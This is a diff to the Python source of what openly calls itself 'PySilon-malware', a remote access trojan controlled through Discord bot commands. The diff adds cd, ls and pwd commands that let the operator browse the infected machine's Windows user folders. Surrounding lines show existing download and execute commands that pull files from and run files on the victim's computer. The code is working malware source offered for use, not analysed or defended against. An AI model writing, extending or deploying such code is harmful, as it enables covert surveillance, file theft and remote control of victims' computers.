@@ -1,7 +1,10 @@
 from bs4 import BeautifulSoup
 from zipfile import ZipFile
+from getpass import getuser
 import requests
 import os
+
+working_directory = ['C:', 'Users', getuser()]
 
 @client.command(name='download')
 async def file_downloading(ctx, file_to_download=None):
@@ -188,3 +191,63 @@ async def execute_file(ctx, file_to_exec=None):
         embed = discord.Embed(title="📛 Error",description=f'```Syntax: .execute <path/to/file>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
+
+@client.command(name="cd")
+async def travarse_working_dir(ctx, path=None):
+    if path != None:
+        if os.path.isdir('/'.join(working_directory) + '/' + path):
+            if '/' in path:
+                for dir in path.split('/'):
+                    if dir == '..':
+                        working_directory.pop(-1)
+                    else:
+                        working_directory.append(dir)
+            else:
+                if path == '..':
+                    working_directory.pop(-1) 
+                else:
+                    working_directory.append(path)
+            await ctx.send('```You are now in: ' + '/'.join(working_directory) + '```')
+        else:
+            if os.path.isdir(path): 
+                working_directory.clear()
+                for dir in path.split('/'):
+                    working_directory.append(dir)
+                await ctx.send('```You are now in: ' + '/'.join(working_directory) + '```')
+            else:
+                await ctx.send('```❗ Directory not found.```')
+
+@client.command(name="ls")
+async def list_working_directory(ctx):
+    await ctx.message.delete() 
+    dir_content_f, dir_content_d, directory_content = [], [], []
+
+    for element in os.listdir('/'.join(working_directory)+'/'):
+        if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
+        else: dir_content_d.append(element)
+
+    dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)
+
+    for single_directory in dir_content_d: directory_content.append(single_directory)
+    for single_file in dir_content_f: directory_content.append(single_file)
+
+    await ctx.send('```Content of ' + '/'.join(working_directory) +'/ at ' + pysilon_misc.current_time() + '```')
+    lsoutput = directory_content
+    while lsoutput != []:
+        if len('\n'.join(lsoutput)) > 1994:
+            temp = ''
+            while len(temp+lsoutput[0])+1 < 1994:
+                temp += lsoutput[0] + '\n'
+                lsoutput.pop(0)
+            await ctx.send('```' + temp + '```')
+        else:
+            await ctx.send('```' + '\n'.join(lsoutput) + '```')
+            lsoutput = []
+
+@client.command(name="pwd")
+async def print_working_directory(ctx):
+    await ctx.message.delete()
+
+    embed = discord.Embed(title=f"🟣 System",description=f"Current directory: `{'/'.join(working_directory)}`", colour=discord.Colour.purple())
+    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+    await ctx.send(embed=embed)
